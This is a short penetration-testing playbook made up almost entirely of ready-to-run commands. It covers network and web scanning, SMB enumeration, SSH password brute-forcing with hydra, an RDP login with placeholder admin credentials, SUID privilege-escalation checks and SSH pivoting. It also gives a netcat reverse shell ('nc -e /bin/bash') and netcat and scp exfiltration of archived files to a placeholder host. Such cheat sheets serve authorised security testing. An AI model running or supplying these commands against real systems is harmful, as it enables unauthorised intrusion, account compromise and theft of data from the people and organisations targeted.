# Penetration Testing Commands

This playbook contains common commands used during penetration testing engagements.

## Initial Reconnaissance

### Nmap Basic Scan
```bash
nmap -sV -sC -O $TargetIP
```

### Nmap Full Port Scan
```bash
nmap -p- -T4 $TargetIP
```

### Web Directory Enumeration
```bash
gobuster dir -u http://$TargetIP:$Port -w $Wordlist -t 50
```

## Exploitation

### SMB Enumeration
```bash
enum4linux -a $TargetIP
smbclient -L $TargetIP
smbmap -H $TargetIP
```

### Brute Force SSH
```bash
hydra -L $UserFile -P $PassFile ssh://$TargetIP
```

### RDP Connection
```bash
xfreerdp /u:admin /p:password /v:$TargetIP:$Port
```

## Post Exploitation

### Privilege Escalation Check (Linux)
```bash
./linpeas.sh
find / -perm -u=s -type f 2>/dev/null
```

### Pivoting with SSH Local Port Forwarding
```bash
ssh -L $Port:internal_host:internal_port user@$TargetIP
```

### Create Reverse Shell
```bash
nc -e /bin/bash $DCIP $Port
```

## Data Exfiltration

### Compress Files
```bash
tar -czvf data.tar.gz /path/to/files
```

### Transfer Files with Netcat
```bash
# On receiving machine
nc -lvp $Port > data.tar.gz

# On sending machine
nc $DCIP $Port < data.tar.gz
```

### Use SSH for Transfer
```bash
scp data.tar.gz user@$DCIP:/path/to/destination
```
